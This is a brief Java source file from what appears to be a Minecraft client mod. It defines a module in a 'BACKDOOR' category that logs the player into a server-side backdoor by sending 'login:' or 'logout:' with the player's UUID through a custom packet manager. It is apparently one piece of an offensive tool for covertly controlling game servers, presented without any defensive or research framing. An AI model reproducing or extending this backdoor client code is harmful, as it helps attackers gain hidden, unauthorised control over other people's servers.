package lol.moruto.mod.module.impl;

import lol.moruto.mod.backdoor.PacketManager;
import lol.moruto.mod.module.Category;
import lol.moruto.mod.module.Module;

public class LoginModule extends Module {
    public LoginModule() {
        super("Login", "Login the backdoor", Category.BACKDOOR);
    }

    @Override
    public void onEnable() {
        PacketManager.sendToServer("login:" + mc.player.getUuidAsString());
    }

    @Override
    public void onDisable() {
        PacketManager.sendToServer("logout:" + mc.player.getUuidAsString());
    }
}
